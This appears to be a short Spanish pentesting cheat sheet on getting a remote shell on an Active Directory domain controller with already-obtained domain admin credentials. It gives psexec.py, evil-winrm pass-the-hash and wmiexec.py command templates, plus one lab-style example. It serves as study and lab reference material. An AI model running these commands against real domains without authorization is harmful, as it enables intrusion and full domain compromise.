# Requisitos
Para ganar acceso al `Domain Controller` debemos disponer de credenciales válidas de un `Administrador del dominio`.

# Realizar Autenticación
Una forma de hacerlo es mediante `psexec`, podemos saber si podemos autenticarnos si el crackmapexec nos da un `Pwn3d!` para ese equipo.
```
psexec.py <dominio>/<usuario>:<contraseña>@<ip_DC> cmd.exe
```
Ejemplo:
```
psexec.py wizzz.local/Administrador:Passw0rd@192.168.45.130 cmd.exe
```

# Pass The Hash
También podemos ganar acceso si hemos conseguido su `hash` mediante `evil-winrm`
```
evil-winrm -i <ip-DC> -u '<Administrator>' -H '<hash>'
```
Se puede hacer también con otras herramientas como `wmiexec`
```
wmiexec.py <dominio>/<usuario>@<ip> -hashes <hash_ntds>
```

